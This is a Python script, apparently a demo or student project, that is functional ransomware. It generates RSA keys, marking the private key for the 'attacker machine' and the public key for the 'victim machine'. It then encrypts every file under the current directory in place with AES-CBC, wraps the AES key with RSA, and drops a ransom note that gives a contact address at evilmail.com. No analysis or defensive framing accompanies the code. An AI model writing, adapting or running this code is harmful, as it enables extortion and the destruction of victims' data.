import os
from cryptography.hazmat.primitives import padding, hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.backends import default_backend

# === Generate RSA key pair if not already present ===
def generate_rsa_keys():
    if not os.path.exists("../private_key.pem") or not os.path.exists("../public_key.pem"):
        print("Generating RSA key pair...")

        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()

        # Save private key (stay on attacker machine)
        with open("../private_key.pem", "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))

        # Save public key (goes to victim machine)
        with open("../public_key.pem", "wb") as f:
            f.write(public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))
        print("RSA keys generated.")
    else:
        print("RSA keys already exist.")

# === Generate a random AES key ===
def generate_aes_key():
    return os.urandom(32)  # 256-bit key

# === Pad file contents ===
def pad_data(data):
    padder = padding.PKCS7(128).padder()
    return padder.update(data) + padder.finalize()

# === AES-CBC Encryption ===
def encrypt_file(file_path, aes_key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as f:
        plaintext = f.read()

    padded = pad_data(plaintext)
    ciphertext = encryptor.update(padded) + encryptor.finalize()

    with open(file_path, 'wb') as f:
        f.write(iv + ciphertext)

# === Encrypt AES key with RSA Public Key ===
def encrypt_aes_key_with_rsa(aes_key, public_key_path='../public_key.pem'):
    with open(public_key_path, 'rb') as f:
        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

    encrypted_key = public_key.encrypt(
        aes_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open('encrypted_aes_key.bin', 'wb') as f:
        f.write(encrypted_key)

# === Drop a ransom note ===
def drop_ransom_note():
    note = """\
YOUR FILES HAVE BEEN ENCRYPTED’

Pay the ransom nd get back your stuffs.
Contact us at: attacker@evilmail.com

Do NOT try to recover files yourself. Any attempt to do so may result in permanent data loss.
"""
    with open("README_RESTORE_FILES.txt", "w") as f:
        f.write(note)

# === Scan and encrypt all files in a target directory ===
def encrypt_directory(target_dir, aes_key):
    skip_exts = ['.py', '.pem', '.bin']

    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if any(file.endswith(ext) for ext in skip_exts):
                continue

            path = os.path.join(root, file)
            try:
                if file=="README_RESTORE_FILES.txt":
                    continue
                encrypt_file(path, aes_key)
                print(f"Encrypted: {path}")
            except Exception as e:
                print(f"Failed to encrypt {path}: {e}")

# === MAIN ===
if __name__ == "__main__":
    # Step 0: Generate RSA keys if not already there
    generate_rsa_keys()

    # Step 1: Generate AES key
    aes_key = generate_aes_key()

    # Step 2: Encrypt files in current directory
    target_folder = os.getcwd()
    encrypt_directory(target_folder, aes_key)

    # Step 3: Encrypt AES key with public key
    encrypt_aes_key_with_rsa(aes_key)

    # Step 4: Drop ransom note
    drop_ransom_note()

    # Step 5: Delete AES key from memory
    del aes_key

    print("\nAll done. Files encrypted and ransom note dropped.")
